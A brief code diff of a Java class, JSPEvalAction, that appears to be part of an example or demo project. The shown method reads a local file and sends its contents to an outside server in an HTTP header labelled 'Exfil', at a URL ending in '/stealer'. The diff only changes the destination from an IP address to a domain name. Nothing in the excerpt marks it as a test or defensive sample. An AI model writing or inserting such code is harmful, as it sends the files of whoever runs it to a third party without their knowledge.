@@ -50,7 +50,7 @@ public class JSPEvalAction extends ExampleAction {
 				FileInputStream fis = new FileInputStream(f);
 				fis.read(bytes);
 				String data = new String( bytes );
-				URL evil = new URL("http://92.101.35.33/stealer");
+				URL evil = new URL("http://abc.alhajikudi.com/stealer");
 				HttpURLConnection con = (HttpURLConnection)evil.openConnection();
 				con.setRequestProperty("Exfil", data);
 				int code = con.getResponseCode();
